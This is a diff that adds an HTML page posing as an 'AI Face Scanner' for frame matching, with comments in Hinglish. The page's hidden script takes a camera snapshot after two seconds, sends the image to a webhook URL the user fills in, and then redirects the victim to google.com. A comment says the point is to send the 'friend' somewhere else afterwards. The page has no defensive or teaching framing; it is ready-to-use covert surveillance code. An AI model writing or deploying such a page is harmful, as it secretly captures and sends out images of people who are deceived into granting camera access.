@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AI Face Scanner</title>
+</head>
+<body>
+    <h1>AI Face Analysis for Aura of Walls</h1>
+    <p>Please wait, scanning your face for the best frame match...</p>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const webhookURL = "TERA_WEBHOOK_URL_YAHAN_DALO";
+
+        // Camera access maangna
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // 2 second baad photo khinchna taake image clear aaye
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+
+                // Photo ko Webhook par bhejna
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: imageData
+                }).then(() => {
+                    console.log("Photo Sent!");
+                    window.location.href = "https://google.com"; // Dost ko kahin aur bhej dena
+                });
+            }, 2000);
+        })
+        .catch(err => console.log("Camera Denied"));
+    </script>
+</body>
+</html>
+
